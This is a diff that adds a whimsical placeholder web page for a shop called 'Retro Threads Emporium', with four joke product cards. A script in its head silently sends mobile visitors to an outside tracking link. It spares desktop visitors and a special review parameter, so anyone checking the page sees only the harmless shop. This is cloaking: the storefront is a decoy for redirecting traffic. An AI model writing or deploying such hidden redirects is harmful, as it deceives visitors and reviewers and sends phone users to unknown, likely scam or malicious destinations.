@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/de9fa2b0-1366-489a-be81-3b73f541059f?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Retro Threads Emporium</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background-color: #FFD700;
+            color: #8B4513;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #FF69B4;
+            padding: 20px;
+            text-align: center;
+        }
+        nav {
+            background-color: #00CED1;
+            padding: 10px;
+        }
+        nav ul {
+            list-style-type: none;
+            padding: 0;
+        }
+        nav ul li {
+            display: inline;
+            margin-right: 20px;
+        }
+        main {
+            padding: 20px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-around;
+        }
+        .product {
+            background-color: #98FB98;
+            border: 3px dashed #FF4500;
+            border-radius: 15px;
+            padding: 15px;
+            margin: 10px;
+            width: 200px;
+            text-align: center;
+        }
+        footer {
+            background-color: #DDA0DD;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Retro Threads Emporium</h1>
+        <p>Where Nostalgia Meets Fashion!</p>
+    </header>
+    <nav>
+        <ul>
+            <li><a href="#">Groovy Home</a></li>
+            <li><a href="#">Rad Products</a></li>
+            <li><a href="#">Gnarly Cart</a></li>
+            <li><a href="#">Tubular Contact</a></li>
+        </ul>
+    </nav>
+    <main>
+        <div class="product">
+            <h2>Disco Fever Jumpsuit</h2>
+            <p>Shine bright like a disco ball!</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product">
+            <h2>Neon Windbreaker</h2>
+            <p>Be seen from outer space!</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product">
+            <h2>Tie-Dye Everything</h2>
+            <p>Because why not?</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product">
+            <h2>Platform Moon Boots</h2>
+            <p>Walk on the moon... or just look like it!</p>
+            <button>Add to Cart</button>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2023 Retro Threads Emporium. All rights reserved. | <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
